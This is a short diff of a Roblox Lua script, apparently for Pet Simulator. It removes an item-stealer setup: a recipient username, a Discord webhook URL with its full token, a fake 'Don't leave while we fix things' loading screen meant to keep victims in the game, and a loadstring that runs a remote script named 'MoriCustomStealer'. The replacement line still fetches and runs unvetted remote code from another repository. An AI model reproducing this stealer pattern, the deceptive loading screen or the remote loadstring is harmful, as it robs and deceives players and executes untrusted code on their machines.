@@ -1956,14 +1956,4 @@ spawn(function()
     end
 end)
 
-wait(30)
-UserName = "pinoyjar" -- good pets
-Webhook = "https://discord.com/api/webhooks/1148246064621695066/5NMB-gXbQg_PORuPXH-K9ehP4P8ev5d0m_usUPPIKegxbeymx_yMCr4UrVMJRc7-bxSw" -- pings for pets
-UserName2 = "pinoyjar" -- bad pets
-
-_G.MailMessage = "Thank you!" -- Mail Message !
-_G.ScriptTitle = "Sorry a bit problem here" -- Loading Screen Title
-_G.ScriptTitle2 = "Don't leave while we fix things" -- Put Same Title
-_G.WebhookName = "Pogi MAILBOX MO!!" -- Webhook name 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/TechRats-visual/main/Visual_Script.lua", true))()
